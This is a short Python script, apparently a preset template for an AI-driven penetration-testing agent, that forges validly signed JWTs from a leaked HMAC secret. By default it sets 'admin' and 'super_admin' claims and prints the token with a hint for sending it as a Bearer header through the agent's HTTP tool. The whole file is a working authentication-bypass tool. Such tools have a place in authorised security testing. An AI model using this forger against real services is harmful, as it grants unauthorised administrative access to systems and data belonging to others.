#!/usr/bin/env python3
"""
Free-attack 预置模板：JWT 伪造验证（只读）

用法:
    python jwt-forge.py -u <target-url>

环境变量:
    PENTEST_FA_JWT_SECRET    泄露的签名密钥（必填）
    PENTEST_FA_JWT_CLAIMS    JSON 字符串，默认 {"sub":"admin","role":"super_admin"}
    PENTEST_FA_JWT_ALG       hs256（默认）/ hs384 / hs512

行为:
    - 用泄露密钥生成一个合法签名的 JWT
    - 打印 token；agent 用 pentest_http 带 Authorization: Bearer <token> 验证
    - 不向目标发送任何请求（纯本地伪造，token 验证由 agent 完成）
输出:
    JSON { ok, token, header, payload, algorithm }
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import sys

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def sign(payload: bytes, secret: str, algorithm: str) -> str:
    header = {"alg": algorithm.upper(), "typ": "JWT"}
    signing_input = f"{b64url(json.dumps(header, separators=(',', ':')).encode())}.{b64url(payload)}".encode()
    if algorithm == "hs256":
        digest = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    elif algorithm == "hs384":
        digest = hmac.new(secret.encode(), signing_input, hashlib.sha384).digest()
    else:
        digest = hmac.new(secret.encode(), signing_input, hashlib.sha512).digest()
    return f"{signing_input.decode()}.{b64url(digest)}"

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    args = parser.parse_args()
    secret = os.environ.get("PENTEST_FA_JWT_SECRET", "").strip()
    if not secret:
        print(json.dumps({"ok": False, "reason": "missing PENTEST_FA_JWT_SECRET env"}, ensure_ascii=False))
        return 2
    algorithm = os.environ.get("PENTEST_FA_JWT_ALG", "hs256").strip().lower()
    if algorithm not in ("hs256", "hs384", "hs512"):
        print(json.dumps({"ok": False, "reason": "PENTEST_FA_JWT_ALG must be hs256/hs384/hs512"}, ensure_ascii=False))
        return 2
    try:
        claims = json.loads(os.environ.get("PENTEST_FA_JWT_CLAIMS", '{"sub":"admin","role":"super_admin"}'))
    except json.JSONDecodeError as error:
        print(json.dumps({"ok": False, "reason": f"invalid PENTEST_FA_JWT_CLAIMS: {error}"}, ensure_ascii=False))
        return 2
    now = int(__import__("time").time())
    claims.setdefault("iat", now)
    claims.setdefault("exp", now + 3600)
    payload = json.dumps(claims, separators=(",", ":")).encode()
    token = sign(payload, secret, algorithm)
    header, body, _ = token.split(".")
    print(json.dumps({
        "ok": True,
        "token": token,
        "header": header,
        "payload": body,
        "algorithm": algorithm,
        "hint": f"Use with: pentest_http --header 'Authorization: Bearer {token[:40]}...'",
    }, ensure_ascii=False))
    return 0

if __name__ == "__main__":
    sys.exit(main())
